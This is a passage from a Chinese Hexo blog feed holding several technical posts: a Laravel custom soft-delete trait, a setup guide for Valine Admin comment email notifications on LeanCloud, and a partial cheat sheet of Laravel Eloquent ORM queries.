\Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addOnlyTrashed</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;macro(<span class="string">'onlyTrashed'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $model = $builder-&gt;getModel();</span><br><span class="line"></span><br><span class="line">            $builder-&gt;withoutGlobalScope(<span class="keyword">$this</span>)</span><br><span class="line">                -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), <span class="string">'&lt;&gt;'</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后应用到Model 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Traits</span>\<span class="title">SoftDeletesEx</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SoftDeletesEx</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> $table = <span class="string">'user'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> $dates = [<span class="string">"is_deleted"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/loophome/article/details/81978010" target="_blank" rel="noopener">laravel框架自定义软删除</a></li><li><a href="http://blog.dreamlikes.cn/archives/892" target="_blank" rel="noopener">Laravel5软删除（SoftDeletes）的deleted_at改造</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Valine 如何开启评论邮件通知</title>
      <link href="/how-does-valine-turn-on-comment-email-notifications/"/>
      <url>/how-does-valine-turn-on-comment-email-notifications/</url>
      
        <content type="html"><![CDATA[<p>事情是这样的，昨天无意在博客上看到一条留言，留言时间是两天之前，我才意识到目前的评论系统缺少通知 =_=!。</p><a id="more"></a><p>没有通知这怎么能行呢？因为我用的是一款叫做<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 的评论系统，马上Google 了一下，于是有了这篇笔记。</p><p>所以这篇笔记的内容，可能不适用其他评论系统。</p><hr><p><code>Valine Admin</code> 是 Valine 评论系统的后端功能补充和增强，主要实现评论邮件通知、评论管理、垃圾评论过滤等功能。支持完全自定义的邮件通知模板，基于Akismet API实现准确的垃圾评论过滤。</p><p>在正式开始之前，首先得注册一个<a href="https://leancloud.cn/" target="_blank" rel="noopener">LeanCloud</a> 账号。</p><blockquote><p>LeanCloud 是什么？</p></blockquote><p>它是一站式后端云服务提供商，到时候我们的评论系统就是要部署在这个云服务上。</p><h2 id="创建云引擎"><a href="#创建云引擎" class="headerlink" title="创建云引擎"></a>创建云引擎</h2><p>注册成功之后，进入控制台，新建一个应用：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404104053.png" alt=""></p><p>选择开发板就好。</p><p>然后进入刚创建好的应用，依次点击设置=&gt; 应用Key，可以看到<code>AppID</code> 和<code>AppKey</code>，这两个东西很重要，</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404104646.png" alt=""></p><p>打开博客主题的配置文件，在对应的位置分别填上<code>appId</code>和<code>appKey</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404105011.png" alt=""></p><p>下一步需要绑定域名，这里需要绑定的域名，就是你的博客的域名，国内版可能有多个域名绑定供选，这里选择云引擎就好。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404105507.png" alt=""></p><p>到时候这个域名就是进入我们的评论系统的入口。</p><p>需要先完成CNAME 域名解析，绑定才会生效。</p><p>进入你的域名管理后台，添加一条<code>CNAME</code> 记录，主机名称就是刚才绑定的子域名。</p><p>域名解析没那么快，等待的时间可以开始配置云引擎。</p><p>进入云引擎=&gt;设置，添加云引擎环境变量：</p><table><thead><tr><th>变量</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>SITE_NAME</td><td>Boo’s Blog</td><td>[必填]博客名称</td></tr><tr><td>SITE_URL</td><td><a href="https://0x2beace.com" target="_blank" rel="noopener">https://0x2beace.com</a></td><td>[必填]首页地址</td></tr><tr><td>SMTP_SERVICE</td><td>QQ</td><td>[新版支持]邮件服务提供商，支持 QQ、163、126、Gmail 以及 更多</td></tr><tr><td>SMTP_USER</td><td><a href="mailto:xxxxxx@qq.com">xxxxxx@qq.com</a></td><td>[必填]SMTP登录用户</td></tr><tr><td>SMTP_PASS</td><td>ccxxxxxxxxch</td><td>[必填]SMTP登录密码</td></tr><tr><td>SENDER_NAME</td><td>Boo</td><td>[必填]发件人</td></tr><tr><td>SENDER_EMAIL</td><td><a href="mailto:xxxxxx@qq.com">xxxxxx@qq.com</a></td><td>[必填]发件邮箱</td></tr><tr><td>ADMIN_URL</td><td><a href="https://xxx.0x2beace.com/" target="_blank" rel="noopener">https://xxx.0x2beace.com/</a></td><td>[建议]Web主机二级域名（云引擎域名），用于自动唤醒</td></tr><tr><td>BLOGGER_EMAIL</td><td><a href="mailto:xxxxx@gmail.com">xxxxx@gmail.com</a></td><td>[可选]博主通知收件地址，默认使用SENDER_EMAIL</td></tr><tr><td>AKISMET_KEY</td><td>xxxxxxxx</td><td>[可选]Akismet Key 用于垃圾评论检测，设为MANUAL_REVIEW开启人工审核，留空不使用反垃圾</td></tr></tbody></table><p>点击保存之后，切换到云引擎=&gt;部署，部署模式选择部署项目-Git部署，分支master，手动部署目标环境为生产环境，Git 仓库填入：<code>https://github.com/DesertsP/Valine-Admin.git</code>，点击部署即可。</p><h2 id="评论管理"><a href="#评论管理" class="headerlink" title="评论管理"></a>评论管理</h2><h3 id="注册管理员"><a href="#注册管理员" class="headerlink" title="注册管理员"></a>注册管理员</h3><p>如果这时域名解析已经完成，那么访问：<code>https://云引擎域名/</code>，应该可以看到如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404111837.png" alt=""></p><p>这是还没有管理员账号，需要先通过<code>https://云引擎域名/sign-up/</code>注册一个。</p><p>至此就已经可以管理我们的评论了，但是目前还没有邮件通知。</p><h2 id="设置定时任务"><a href="#设置定时任务" class="headerlink" title="设置定时任务"></a>设置定时任务</h2><p>这里设置定时任务的目的就是，每天定时检查是否存在漏发的邮件。</p><p>进入云引擎=&gt; 定时任务，创建两个定时任务：</p><ol><li>选择self-wake云函数，Cron表达式为<code>0 */30 0-16 * * ?</code>，表示每天早0点到晚16点每隔30分钟访问云引擎。</li><li>选择resend-mails云函数，Cron表达式为<code>0 0 0 * * ?</code>，表示每天0点检查过去24小时内漏发的通知邮件并补发。</li></ol><h2 id="邮件通知模版-可选配置"><a href="#邮件通知模版-可选配置" class="headerlink" title="邮件通知模版(可选配置)"></a>邮件通知模版(可选配置)</h2><p>邮件通知模板在云引擎环境变量中设定，可自定义通知邮件标题及内容模板。</p><table><thead><tr><th>环境变量</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>MAIL_SUBJECT</td><td><code>${PARENT_NICK}</code>，您在${SITE_NAME}上的评论收到了回复</td><td>[可选]@通知邮件主题（标题）模板</td></tr><tr><td>MAIL_TEMPLATE</td><td>见下文</td><td>[可选]@通知邮件内容模板</td></tr><tr><td>MAIL_SUBJECT_ADMIN</td><td>${SITE_NAME}上有新评论了</td><td>[可选]博主邮件通知主题模板</td></tr><tr><td>MAIL_TEMPLATE_ADMIN</td><td>见下文</td><td>[可选]博主邮件通知内容模板</td></tr></tbody></table><p>邮件通知包含两种，分别是被@通知和博主通知，这两种模板都可以完全自定义。默认使用经典的蓝色风格模板（样式来源未知）。</p><p>默认被@通知邮件内容模板如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;            $&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;上的评论有了新的回复&lt;&#x2F;h2&gt; $&#123;PARENT_NICK&#125; 同学，您曾发表评论：&lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt;            $&#123;PARENT_COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;回复说：&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;您可以点击&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;，欢迎再次光临&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;。&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>默认博主通知邮件内容模板如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;上的文章有了新的评论&lt;&#x2F;h2&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;回复说：&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;您可以点击&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>这里有个问题就是部分变量不再可用，如果使用了未定义的变量，发送邮件时会抛出异常：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404113532.png" alt=""></p><p>我选择去掉了部分变量，这就导致了邮件部分内容是缺失的：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404113944.png" alt=""></p><p>这里没继续往下深究了，能用就行，至此就完成了所有配置。如果你遇到一些奇怪的问题，可以看看以下建议对你是否有用：</p><blockquote><p>常见问题</p></blockquote><ol><li>LeanCloud 分国内版和国际版，如果你和我一样不喜欢域名备案，使用的是国际域名服务商提供的域名，那么注册LeanCloud 时，请选选择国际版。</li><li>域名解析如果长时间未生效，请检查添加<code>CNAME</code> 纪录，<code>ttl</code> 不要选择一小时，选择六百秒。</li><li><code>SMTP_PASS</code> 不是QQ 邮箱的密码，而是<code>SMTP服务</code>的密钥，如果不知道如何获取，可以看<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=331" target="_blank" rel="noopener">这里</a>。</li><li>修改完变量，需要重启应用，否者不会生效。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/DesertsP/Valine-Admin" target="_blank" rel="noopener">Valine Admin</a></li><li><a href="https://deserts.io/valine-admin-document/" target="_blank" rel="noopener">Valine Admin 配置手册</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Eloquent ORM 常用操作整理</title>
      <link href="/laravel-eloquent-orm-common-operations-finishing/"/>
      <url>/laravel-eloquent-orm-common-operations-finishing/</url>
      
        <content type="html"><![CDATA[<p>Laravel 支持原生的 SQL 查询、流畅的查询构造器 和 Eloquent ORM 三种查询方式：</p><a id="more"></a><ul><li>流畅的查询构造器（简称DB），它是为创建和运行数据库查询提供的一个接口，支持大部分数据库操作，和手写SQL 的本质是一样的。</li><li>Eloquent ORM（简称ORM），是一个对象关系映射(Object Relational Mapper)工具，通过建立模型与数据表进行交互，它会把数据库中的数据映射成对象和集合对象，无需接触底层数据，可以直接调用映射出来的对象进行开发。</li></ul><p>这篇笔记主要来整理下常用的ORM 操作。</p><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><p><code>artisan tinker</code> 是 Laravel 框架自带的命令，用以调出 Laravel 的交互式运行时，Eloquent ORM 的代码可以直接在该环境中运行。</p><h3 id="查询列表"><a href="#查询列表" class="headerlink" title="查询列表"></a>查询列表</h3><p>获取所有数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">User</span>;</span><br><span class="line">$users = User::all();</span><br></pre></td></tr></table></figure><p>如果只需要部分字段，有两种方式进行限定：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$users = User::all([<span class="string">"id"</span>, <span class="string">"name"</span>]);</span><br><span class="line"></span><br><span class="line">$users = User::select(<span class="string">"id"</span>, <span class="string">"name"</span>)-&gt;get();</span><br></pre></td></tr></table></figure><p>获取单列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = User::pluck(<span class="string">'name'</span>);</span><br><span class="line"><span class="comment">// ["boo", "mac", "yumi"]</span></span><br></pre></td></tr></table></figure><p>还可以在返回的集合中指定字段的自定义键名，注意：该自定义键必须是该表的其它字段列名，否则会报错：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = User::pluck(<span class="string">'email'</span>,<span class="string">'name'</span>);</span><br><span class="line"><span class="comment">// ["boo" =&gt; "boo@example.com", "yumi" =&gt; "yumi@example.com"]</span></span><br></pre></td></tr></table></figure><h3 id="查询单条数据"><a href="#查询单条数据" class="headerlink" title="查询单条数据"></a>查询单条数据</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过主键获取模型</span></span><br><span class="line">$user = User:;find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取匹配查询条件的第一个模型</span></span><br><span class="line">$user = User::where(<span class="string">'is_enable'</span>, <span class="number">1</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一条数据的指定列值</span></span><br><span class="line">$user = User::value(<span class="string">"name"</span>);  </span><br><span class="line"><span class="comment">// 返回结果是字符串：boo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 传递主键数组来调用 find 方法，返回匹配记录集合</span></span><br><span class="line">$user = User::find([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);  </span><br><span class="line"><span class="comment">// 等同于 </span></span><br><span class="line">$user = User::whereIn(<span class="string">"id"</span>, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])-&gt;get();</span><br></pre></td></tr></table></figure><h3 id="处理返回结果集"><a href="#处理返回结果集" class="headerlink" title="处理返回结果集"></a>处理返回结果集</h3><p>Eloquent ORM 查询返回值是 <code>Illuminate\Database\EloquentCollection</code> 的一个实例，所以除了可以使用传统的数组方式进行遍历，还可以使用集合方式进行遍历。</p><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><p><code>chunk</code>方法可以把大的结果集分成小块查询，例如，我们可以将全部User 表数据切割成一次处理 <code>5</code> 条记录的一小块：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$result = User::chunk(<span class="number">5</span>, <span class="function"><span class="keyword">function</span> <span class="params">($users)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($users <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $user-&gt;name.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// result 为 boolean</span></span><br></pre></td></tr></table></figure><p>在User表中一共有<code>14</code>条数据，通过查看查询日志，可以看到<code>chunk</code> 分了三次查询 ：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210403172906.png" alt=""></p><h4 id="each"><a href="#each" class="headerlink" title="each"></a>each</h4><p>如果想对一个集合中的每一项都进行一些操作，但不修改集合本身，则可以使用<code>each</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$users = User::all();</span><br><span class="line">$users = $users-&gt;each(<span class="function"><span class="keyword">function</span> <span class="params">($user , $key)</span> </span>&#123;</span><br><span class="line">    $user-&gt;password = bcrypt(<span class="number">122410</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 返回结果包含完整的User模型，其中password 字段的值被修改</span></span><br></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>如果想对集合中的所有元素进行迭代，对它们进行修改，并返回包含修改的新集合，那么需要使用<code>map</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$users = User::all();</span><br><span class="line">$users = $users-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($user, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">"name"</span> =&gt; $user-&gt;name,</span><br><span class="line">        <span class="string">"password"</span> =&gt; bcrypt(<span class="number">122410</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 返回结果仅包含name 和password 字段，其中password 字段的值被修改</span></span><br></pre></td></tr></table></figure><h3 id="聚合方法"><a href="#聚合方法" class="headerlink" title="聚合方法"></a>聚合方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 统计总数</span></span><br><span class="line">$count = User::count();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计分组</span></span><br><span class="line">$count = User::groupBy(<span class="string">"is_enable"</span>)-&gt;selectRaw(<span class="string">"count(id) as aggregate"</span>)-&gt;get();</span><br><span class="line"><span class="comment">// 注意不能这样写：User::select('count(id) as aggregate')-&gt;groupBy("is_enable")-&gt;get();</span></span><br></pre></td></tr></table></figure><h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><p>构建复杂查询：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组合查询方式一</span></span><br><span class="line">$where = [];</span><br><span class="line">$where[] = [<span class="string">"is_enable"</span>, <span class="number">1</span>];</span><br><span class="line">$where[] = [</span><br><span class="line">  <span class="function"><span class="keyword">function</span><span class="params">($query)</span></span>&#123;</span><br><span class="line">  $query-&gt;where(<span class="string">"id"</span>, <span class="string">"&gt;"</span>, <span class="number">10</span>)</span><br><span class="line">    -&gt;orWhere(<span class="string">"name"</span>, <span class="string">"like"</span>, <span class="string">"%admin%"</span>);</span><br><span class="line">&#125;];</span><br><span class="line">User::select(<span class="string">"id"</span>, <span class="string">"name as username"</span>, <span class="string">"email"</span>)-&gt;where($where)-&gt;get(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 组合查询方式二</span></span><br><span class="line">$builder = User::select(<span class="string">"id"</span>, <span class="string">"name as username"</span>, <span class="string">"email"</span>);</span><br><span class="line">$builder-&gt;where(<span class="string">"is_enable"</span>, <span class="number">1</span>);</span><br><span class="line">$builder-&gt;where(<span class="function"><span class="keyword">function</span> <span class="params">($query)</span></span>&#123;</span><br><span class="line">  $query-&gt;where(<span class="string">"id"</span>, <span class="string">"&gt;"</span>, <span class="number">10</span>)</span><br><span class="line">    -&gt;orWhere(<span class="string">"name"</span>, <span class="string">"like"</span>, <span class="string">"%admin%"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$users = $builder-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两种方式的查询SQL 是一样的： select `id`, `name` as `username`, `email` from `users` where (`is_enable` = '1' and (`id` &gt; '10' or `name` like '%admin%'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Where Exists</span></span><br><span class="line">$builder = User::select(<span class="string">"id"</span>, <span class="string">"name"</span>, <span class="string">"email"</span>);</span><br><span class="line">$builder-&gt;whereExists(<span class="function"><span class="keyword">function</span> <span class="params">($query)</span></span>&#123;</span><br><span class="line">    $query-&gt;select(User::raw(<span class="number">1</span>))</span><br><span class="line">        -&gt;from(<span class="string">"topics"</span>)</span><br><span class="line">        -&gt;whereRaw(<span class="string">"topics.user_id = users.id"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 查询发过文章的用户</span></span><br></pre></td></tr></table></figure><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用户id 倒序</span></span><br><span class="line">$user = User::orderBy(<span class="string">"id"</span>, <span class="string">"desc"</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取created_at 最大的一条记录</span></span><br><span class="line">$user = User::latest()-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取created_at 最小的一条记录</span></span><br><span class="line">$user = User::oldest()-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机一条记录</span></span><br><span class="line">$users = User::inRandomOrder()-&gt;first();</span><br></pre></td></tr></table></figure><h3 id="限定"><a href="#限定" class="headerlink" title="限定"></a>限定</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 跳过前两条记录，取三条记录</span></span><br><span class="line">$users = User::skip(<span class="number">2</span>)-&gt;take(<span class="number">3</span>)-&gt;get();</span><br><span class="line"><span class="comment">// 输出SQL：select * from `users` limit 3 offset 2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上</span></span><br><span class="line">$users = User::offset(<span class="number">2</span>)-&gt;limit(<span class="number">3</span>)-&gt;get();</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用别名</span></span><br><span class="line">$user = User::select(<span class="string">"name as username"</span>, <span class="string">"id"</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个查询构建器</span></span><br><span class="line">$builder = User::select(<span class="string">"name"</span>);</span><br><span class="line"><span class="comment">// 添加一个查询列到已存在的 select 子句</span></span><br><span class="line">$user = $builder-&gt;addSelect(<span class="string">"id"</span>)-&gt;first();</span><br></pre></td></tr></table></figure><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$users &#x3D; User::paginate(10);</span><br><span class="line">$users &#x3D; User::simplePaginate(10);</span><br></pre></td></tr></table></figure><ol><li><code>paginate</code> 方法，返回<code>Illuminate\Pagination\LengthAwarePaginator</code>实例</li><li><code>simplePaginate</code> 方法，返回<code>Illuminate\Pagination\Paginator</code>实例</li></ol><p>每个分页器实例都可以通过以下方法提供更多分页信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$result-&gt;count()            &#x2F;&#x2F; 当前页条数    </span><br><span class="line">$result-&gt;currentPage()      &#x2F;&#x2F; 当前页码</span><br><span class="line">$result-&gt;perPage()          &#x2F;&#x2F; 每页多少条</span><br><span class="line">$result-&gt;total()            &#x2F;&#x2F; 总数(使用simplePaginate 时无效)</span><br><span class="line">$result-&gt;hasMorePages()     &#x2F;&#x2F; 是否有更多</span><br><span class="line">$result-&gt;firstItem()      </span><br><span class="line">$result-&gt;lastItem()</span><br><span class="line">$result-&gt;lastPage() (使用simplePaginate 时无效)</span><br><span class="line">$result-&gt;nextPageUrl()</span><br><span class="line">$result-&gt;previousPageUrl()</span><br><span class="line">$result-&gt;url($page)</span><br></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>单条插入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 